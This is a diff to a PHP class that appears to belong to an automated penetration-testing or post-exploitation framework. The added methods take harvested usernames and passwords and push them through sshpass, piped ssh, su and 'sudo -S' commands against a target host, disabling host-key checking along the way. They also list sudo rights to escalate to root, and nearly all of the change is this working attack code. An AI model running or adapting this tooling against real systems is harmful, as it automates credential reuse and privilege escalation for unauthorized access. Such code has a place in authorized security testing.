@@ -218,20 +218,33 @@ lxc launch SomeAlias MyMachine
             return "";
         }
     }
+   
+    public function misc2user8pass8remote($username,$userpass,$ssh_port){
+        $this->ssTitre(__FUNCTION__);
+        $username = trim($username);
+        $userpass = trim($userpass);
+        $ssh_port = trim($ssh_port);
+        
+        $template_id_euid = "sshpass -p '$userpass' ssh $username@$this->ip -p $ssh_port -C \"%ID%\" ";
+        $query = str_replace("%ID%","id", $template_id_euid);
+        $this->requette($query);
+        //$this->lan2pentest8id($template_id_euid);
+        //===============================================================
+    }
     
-    
-    public function misc2user8pass($username,$userpass,$ssh_port){
+    public function misc2user8pass8local($username,$userpass,$ssh_port){
         $this->ssTitre(__FUNCTION__);
         $username = trim($username);
         $userpass = trim($userpass);
         $ssh_port = trim($ssh_port);
         
         $template_id_euid = "echo -e \"ssh $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' <<#$userpass\n> /dev/tty\nls > /dev/tty\n#\" | bash ";
-
+        $template_id_euid = "(echo '$userpass'; sleep 3; ) | ssh $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' ";
         $this->lan2pentest8id($template_id_euid);
         //===============================================================
     }
     
+     
     
     public function misc2user8key($username,$remote_privkey_path,$ssh_port){
         $this->ssTitre(__FUNCTION__);
@@ -375,7 +388,21 @@ lxc launch SomeAlias MyMachine
         }
     }
     
-    
+    public function users4pass(){
+        $this->titre(__FUNCTION__);
+        $ssh_port = $this->ip2port4service("ssh");
+        if (empty($ssh_port)) $ssh_port = "22" ;
+        
+        $users_passwd = $this->ip2users4passwd();
+        foreach ($users_passwd as $user2name => $user2pass){
+            if (!empty($user2name)) {
+                if (!$this->ip2root8db($this->ip2id)) {
+                    $this->misc2user8pass8local($user2name, $user2pass,$ssh_port);
+                    $this->misc2user8pass8remote($user2name, $user2pass,$ssh_port);
+                }
+            }
+        }
+    }
     
     
     public function misc2keys(){
@@ -796,20 +823,19 @@ Can be used to determine where other interesting files might be located");
         $users_passwd = $this->ip2users4passwd();
         $tab_users_shell = $this->ip2users4shell();
         foreach ($users_passwd as $user2name => $user2pass){
-            if (!empty($user2name))
-                if (!$this->ip2root8db($this->ip2id)) {
-                    if (!$this->ip2root8db($this->ip2id)) $this->users4root($user2name,$user2pass);
-                    if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($this->users2sudoers2list($user2name, $user2pass));
-                    
-                    foreach ($tab_users_shell as $user2name_shell)
-                        if (!$this->ip2root8db($this->ip2id)) {
-                            if (!$this->ip2root8db($this->ip2id)) $this->users4root($user2name_shell,$user2pass);
-                            if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($this->users2sudoers2list($user2name_shell, $user2pass));
-                        }
-                }
+            if (!empty($user2name)) {
+                if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($this->users2sudoers2list($user2name, $user2pass));
+                
+                foreach ($tab_users_shell as $user2name_shell)
+                    if (!empty($user2name_shell)) {
+                        if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($this->users2sudoers2list($user2name_shell, $user2pass));
+                    }
+            }
         }
         $this->pause();
-        
+
+        $this->users4user();
+        $this->users4pass();        
     }
     
     
@@ -818,11 +844,14 @@ Can be used to determine where other interesting files might be located");
     
     public function users2sudoers2list($user_name,$user_pass){
         $this->titre("Linux Privilege Escalation using Sudo Rights");
+        $result = "";
         $this->ssTitre("sudo -l – Prints the commands which we are allowed to run as SUDO ");
+        $data = "sudo -l -U '$user_name' "; // su --login '$user_name'
+        $result .= $this->lan2stream4result($data,$this->stream_timeout*3);
         $data = "echo '$user_pass' | sudo -l -S -U '$user_name' "; // su --login '$user_name'
-        return $this->lan2stream4result($data,$this->stream_timeout*3);
+        $result .=  $this->lan2stream4result($data,$this->stream_timeout*3);
+        return $result;
     }
-    
     
     
     
@@ -856,38 +885,47 @@ Can be used to determine where other interesting files might be located");
     
     
     
-    
-    
-    public function users4root($user_name,$user_pass){
+    public function users4user(){
         $this->ssTitre(__FUNCTION__);
-        /*
-#!/usr/bin/expect -f
-#Usage: runas.sh cmd user pass
-
-set cmd [lindex $argv 0];
-set user [lindex $argv 1];
-set pass [lindex $argv 2];
-
-log_user 0
-spawn su -c $cmd - $user
-expect "Password: "
-log_user 1
-send "$pass\r"
-expect "$ "
-         */
-        $user_name = trim($user_name);
-        $user_pass = trim($user_pass);
-
-        //$template_id_euid = "( sleep $this->stream_timeout*3 ;echo $user_pass; sleep 5;) |  socat - EXEC:\"su --login $user_name --shell $shell --command %ID%\",pty,stderr,setsid,sigint,ctty,sane";
-        $template_id_euid = "echo '$user_pass' | sudo -S su --login '$user_name' --shell /bin/bash --command '%ID%' 2>1 ";
-        
-        
-        return $this->lan2pentest8id($template_id_euid);
+                $users_passwd = $this->ip2users4passwd();
+        foreach ($users_passwd as $user2name => $user2pass){
+            if (!empty($user2name)) {
+                if (!empty($user2pass) && !$this->ip2root8db($this->ip2id) ) $this->users2user($user2name,$user2pass);
+            }
+        }
         
     }
     
     
-     
+    
+    public function users2user($user_name,$user_pass){
+        $this->ssTitre(__FUNCTION__);
+        /*
+         #!/usr/bin/expect -f
+         #Usage: runas.sh cmd user pass
+         
+         set cmd [lindex $argv 0];
+         set user [lindex $argv 1];
+         set pass [lindex $argv 2];
+         
+         log_user 0
+         spawn su -c $cmd - $user
+         expect "Password: "
+         log_user 1
+         send "$pass\r"
+         expect "$ "
+         */
+        $user_name = trim($user_name);
+        $user_pass = trim($user_pass);
+        
+        //$template_id_euid = "( sleep $this->stream_timeout*3 ;echo $user_pass; sleep 5;) |  socat - EXEC:\"su --login $user_name --shell $shell --command %ID%\",pty,stderr,setsid,sigint,ctty,sane";
+        $template_id_euid = "(echo '$user_pass';sleep 1;) |  su --login '$user_name' --shell /bin/bash --command '%ID%' 2>1 ";
+        $this->lan2pentest8id($template_id_euid);
+        $template_id_euid = "echo '$user_pass' | sudo -S su --login '$user_name' --shell /bin/bash --command '%ID%' 2>1 ";
+        $this->lan2pentest8id($template_id_euid);
+        
+    }
+    
     
     
     
